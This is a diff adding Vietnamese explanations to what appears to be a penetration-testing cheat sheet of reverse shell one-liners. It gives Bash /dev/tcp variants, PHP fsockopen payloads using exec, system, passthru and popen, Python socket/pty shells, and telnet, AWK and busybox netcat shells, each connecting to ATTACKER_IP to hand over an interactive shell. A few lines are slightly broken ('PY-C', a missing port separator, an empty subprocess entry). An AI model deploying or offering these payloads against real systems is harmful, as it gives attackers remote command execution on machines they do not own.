@@ -133,4 +133,100 @@ Những payloads dưới đây sử dụng trong Linux đê mở Shell thông qu
 **Normal Bash RS**
 `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1` 
 
+RS này cho thấy một bash shell có thể tương tác, nó chuyển hướng input và output thông qua kết nối TCP tới attacker(`ATTACKER_IP`) trên cổng `443`. `>&` là toán tử kết hợp cả *std ouput* và *std error*
+
+*Bash Read Line RS*
+`exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done` 
+
+RS này tạo một **file description** mới(_trong ví dụ này là `5`_) và kết nối tới một cổng TCP. Nó sẽ đọc và thực thi lệnh từ cổng đó, gửi output trở lại thông qua cổng đó
+
+**Bash With File Descriptor 196 RS**
+
+
+`0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`
+
+RS này sử dụng **file description** (`196`) để tạo một kết nối TCP. Nó cho phép shell đọc lệnh từ mạng và gửi output trở lại thông qua kết nối đó
+
+**Bash With File Descriptor 5 Reverse Shell**
+
+`bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`
+
+`bash -i`: mở bash cho phép tương tác
+
+`5<> /dev/tcp/ATTACKER_IP/4443`: gán **file description** cho `/dev/tcp/ATTACKER_IP/4443` giá trị `5`và thiết lập giao tiếp 2 chiều thông qua toán tử `<` và `>`
+
+`0<&5`: `0` lấy input từ file `5`
+
+`1>&5`: `1` chuyển output sang file `5`
+
+`2>&5`: chuyển thông báo lỗi vào file `5`
+
+Tương tự như ví dụ đầu tiên, câu lệnh này mở 1 shells, nhưng nó sử dụng file descriptor `5` cho input và output, kích hoạt 1 phiên tương tác trên kết nối TCP
+
+### 2. PHP
+**PHP Reverse Shell Using the exec Function**
+
+`php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`
+
+RS này tạo một cổng kết nối tới attacker trên port 443, và sử dụng hàm exec để thực thi shell, chuyển hướng std input và output
+
+**PHP Reverse Shell Using the shell_exec Function**
+
+`php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'`
+
+Tương tự như ví dụ trước, nhưng lần này sử dụng hàm `shell_exec`
+
+**PHP Reverse Shell Using the system Function**
+
+`php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'`
+
+RS này tạo sử dụng hàm `system` để thực thi câu lệnh và trả output tới browser
+
+**PHP Reverse Shell Using the passthru Function**
+
+`php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'`
+
+Hàm `passthru` thực thi câu lệnh và gửi dữ liệu thô(_bin_) cho trình duyệt. 
+
+**PHP Reverse Shell Using the popen Function**
+
+`php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");`
+
+RS này sử dụng hàm `popen` để mở 1 tiến trình 
+
+### 3. Python
+
+**Python Reverse Shell by Exporting Environment Variables**
+
+`export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' `
+
+RS này đặt remote host và port như biến môi trường, tạo một socket connection và sao chép cổng **file description** cho stdin và stdout
+
+**Python Reverse Shell Using the subprocess Module**
+
+RS này sử dụng modun `subprocess` để tạo thêm 1 shell và cài đặt một môi trường quen thuộc như ví dụ bên trên
+
+**Short Python RS**
+
+`PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
+
+Tạo 1 socket (`s`) kết nối tới attacker, và chuyển hướng stdin, stdout, thông báo lỗi để socket sử dụng `os.dup2()`
+
+### 4. Others
+**Telnet**
+
+`TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF`
+
+Tạo 1 `pipe` sử dụng `mkfifo` và kết nôi tới attacker thông qua telnet 
+
+**AWK**
+`awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
+
+RS này sử dụng **AWK** tạo kết nối TCP để kết nối tới attacker. Nó đọc lệnh từ attacker và thực thi. Sau đó gửi kết quat về bằng kết nối TCP trước đó
+
+**BusyBox**
+
+`busybox nc ATTACKER_IP 443 -e sh`
+
+**BusyBox RS** sử dụng netcat để kết nối tới attacker. Khi đã kết nối, nó thực thi `/bin/bash`,  phơi bày dòng lệnh cho attacker
 
